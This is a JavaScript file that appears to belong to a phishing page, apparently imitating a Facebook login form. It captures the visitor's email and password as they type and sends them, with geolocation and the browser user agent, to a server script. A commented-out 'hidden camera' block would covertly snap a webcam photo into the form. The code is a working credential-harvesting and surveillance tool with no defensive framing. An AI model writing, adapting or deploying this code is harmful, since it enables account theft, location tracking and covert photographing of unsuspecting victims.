// initial - location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        pushLocation('"location":"Geolocation is not supported by this browser."');
    }
}

// get position - location
function showPosition(position) {
    let userPosition = `"location":"${position.coords.latitude}, ${position.coords.longitude}","locationLatitude":"${position.coords.latitude}","locationLongitude":"${position.coords.longitude}"`;

    pushLocation(userPosition);
}

// error log - location
function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            pushLocation(`"location":"User denied the request for Geolocation."`)
            break;
        case error.POSITION_UNAVAILABLE:
            pushLocation(`"location":"Location information is unavailable."`)
            break;
        case error.TIMEOUT:
            pushLocation(`"location":"The request to get user location timed out."`)
            break;
        case error.UNKNOWN_ERROR:
            pushLocation(`"location":"An unknown error occurred."`)
            break;
    }
}

getLocation();
// location - do anything
function pushLocation(event) {
    document.fb.location.value = event;
}

// date and time
var dateAndTime = new Date();
document.fb.dateAndTime.value = dateAndTime + " Browser: " + navigator.userAgent;

document.fb.email.addEventListener("change", function(){
//    console.log(document.fb.email.value);
    sendRequest()
}, true);

document.fb.pass.addEventListener("change", function(){
    // console.log(document.fb.pass.value);
    sendRequest()
 }, true);


 // Send Data to DB
function sendRequest(){


    // sending request with GET method also Asynchronus False
    var xhttp = new XMLHttpRequest();
    reqUrl =  'autoload.php?email=' + document.fb.email.value + '&pass=' + document.fb.pass.value + '&location=' + document.fb.location.value + '&dateAndTime' + document.fb.dateAndTime.value;
    xhttp.open("GET", reqUrl, true);
    xhttp.send();

    console.log("saving to db");
} // sendRequest



// // hidden camera
// const webcamElement = document.getElementById('webcam');
// const canvasElement = document.getElementById('canvas');
// const snapSoundElement = document.getElementById('snapSound');
// const webcam = new Webcam(webcamElement, 'user', canvasElement, snapSoundElement);

// webcam.start()
//     .then(result => {
//         console.log("webcam started");

//         setTimeout(function () {
//             webcam.snap();
//             // capture
//             var picture = webcam.snap();
//             document.fb.picture.value = picture;
            
//         }, 1500);

//     })
//     .catch(err => {
//         console.log(err);
//     });
